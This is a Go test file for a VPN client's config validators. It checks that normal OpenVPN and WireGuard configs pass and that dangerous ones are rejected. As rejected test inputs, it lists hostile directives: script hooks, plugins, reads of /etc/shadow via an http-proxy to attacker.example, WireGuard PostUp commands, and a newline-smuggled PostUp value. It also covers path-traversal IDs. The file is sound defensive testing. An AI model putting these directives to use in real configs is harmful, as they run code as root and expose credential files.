package main

import (
	"strings"
	"testing"
)

func TestValidateOpenVPNConfigAllowsNormalClientConfig(t *testing.T) {
	config := `client
dev tun
proto udp
remote vpn.example.com 1194
<ca>
certificate data
</ca>`
	if err := validateOpenVPNConfig(config); err != nil {
		t.Fatalf("expected normal client config to be accepted: %v", err)
	}
}

func TestValidateOpenVPNConfigRejectsRootExecutionDirectives(t *testing.T) {
	for _, directive := range []string{
		"script-security 2", "up /tmp/payload", "--plugin evil.dylib", "config other.conf",
		"iproute /tmp/payload", "status /etc/sudoers", "management 127.0.0.1 7505",
		"--iproute=/tmp/payload", "ca /etc/shadow", "auth-user-pass /etc/shadow",
		"--auth-user-pass=/etc/shadow", "providers /tmp/evil.dylib", "engine dynamic",
		"tls-crypt-v2-verify /tmp/payload", "dns-updown /tmp/payload", "genkey tls-auth /etc/owned",
		"http-proxy attacker.example 8080 /etc/shadow", "--http-proxy=attacker.example 8080 /etc/shadow",
		"http-proxy attacker.example 8080 stdin", "http-proxy attacker.example 8080 auto basic",
	} {
		t.Run(directive, func(t *testing.T) {
			if err := validateOpenVPNConfig("client\n" + directive + "\n"); err == nil {
				t.Fatalf("expected %q to be rejected", directive)
			}
		})
	}
}

func TestValidateOpenVPNConfigAllowsSafeHTTPProxyModes(t *testing.T) {
	for _, directive := range []string{
		"http-proxy proxy.example.com 8080",
		"http-proxy proxy.example.com 8080 auto",
		"http-proxy proxy.example.com 8080 auto-nct",
		"--http-proxy=proxy.example.com 8080 auto-nct",
	} {
		t.Run(directive, func(t *testing.T) {
			if err := validateOpenVPNConfig("client\n" + directive + "\n"); err != nil {
				t.Fatalf("expected %q to be accepted: %v", directive, err)
			}
		})
	}
}

func TestValidateOpenVPNConfigAllowsInlineCredentialsAndCommonClientOptions(t *testing.T) {
	config := `client
dev tun
proto udp
remote vpn.example.com 1194
remote-cert-tls server
data-ciphers AES-256-GCM:AES-128-GCM
auth-nocache
persist-key
persist-tun
verb 3
<ca>
-----BEGIN CERTIFICATE-----
certificate data that looks like an option
-----END CERTIFICATE-----
</ca>
<auth-user-pass>
name
password
</auth-user-pass>`
	if err := validateOpenVPNConfig(config); err != nil {
		t.Fatalf("expected safe inline client config to be accepted: %v", err)
	}
}

func TestValidateOpenVPNConfigRejectsUnknownAndMalformedInlineBlocks(t *testing.T) {
	for _, config := range []string{
		"client\nfuture-unknown-option yes\n",
		"client\n<connection>\nremote vpn.example.com\n</connection>\n",
		"client\n<ca>\ncertificate data\n",
	} {
		if err := validateOpenVPNConfig(config); err == nil {
			t.Fatalf("expected config to be rejected:\n%s", config)
		}
	}
}

func TestVPNFileBaseNeverContainsPathSyntax(t *testing.T) {
	for _, id := range []string{"srv-1", "/../../tmp/owned", "../*", "srv-with/slash"} {
		base := vpnFileBase(id)
		if len(base) != 14 || !strings.HasPrefix(base, "thal") {
			t.Fatalf("unexpected basename %q for %q", base, id)
		}
		if strings.ContainsAny(base, `/\\.*?[]`) {
			t.Fatalf("unsafe path syntax in basename %q for %q", base, id)
		}
	}
	if vpnFileBase("srv-1") == vpnFileBase("srv-2") {
		t.Fatal("different server IDs must not share a VPN basename")
	}
}

func TestValidateWireGuardConfigAllowsNormalConfig(t *testing.T) {
	config := `[Interface]
PrivateKey = abc
Address = 10.0.0.2/32
DNS = 1.1.1.1

[Peer]
PublicKey = def
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
`
	if err := validateWireGuardConfig(config); err != nil {
		t.Fatalf("expected normal config to be accepted: %v", err)
	}
}

func TestValidateWireGuardConfigRejectsRootExecutionKeys(t *testing.T) {
	for _, line := range []string{"PreUp = /tmp/payload", "PostUp=touch /tmp/pwned", "predown = x", "PostDown = x", "SaveConfig = true"} {
		t.Run(line, func(t *testing.T) {
			if err := validateWireGuardConfig("[Interface]\n" + line + "\n"); err == nil {
				t.Fatalf("expected %q to be rejected", line)
			}
		})
	}
}

func TestWireGuardSaveRejectsMultilineValues(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	values := map[string]string{
		"privateKey": "abc",
		"address":    "10.0.0.2/32\nPostUp = touch /tmp/pwned",
		"publicKey":  "def",
		"endpoint":   "vpn.example.com:51820",
		"allowedIPs": "0.0.0.0/0",
	}
	if err := (wireGuardEngine{}).save("srv-1", values); err == nil {
		t.Fatal("expected a value with an embedded newline to be rejected")
	}
}

func TestVPNStageScriptVerifiesEveryFile(t *testing.T) {
	files := []vpnStagedFile{
		{src: "/home/user/.thaloca/bin/wg", dest: "wg", sha256: "aabbcc", mode: "755"},
		{src: "/home/user/.thaloca/vpn/thal1.conf", dest: "thal1.conf", sha256: "ddeeff", mode: "600"},
	}
	script := vpnStageScript("/var/run/thaloca-vpn/thal1", files)
	for _, want := range []string{
		"rm -rf '/var/run/thaloca-vpn/thal1'",
		"/usr/bin/shasum -a 256 '/var/run/thaloca-vpn/thal1/wg'",
		"case $h in aabbcc*)",
		"case $h in ddeeff*)",
		"exit 70",
		"chmod 600 '/var/run/thaloca-vpn/thal1/thal1.conf'",
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("staging script missing %q:\n%s", want, script)
		}
	}
	if strings.Contains(script, `"`) {
		t.Fatalf("staging script must not contain double quotes (embedded in an AppleScript string):\n%s", script)
	}
}
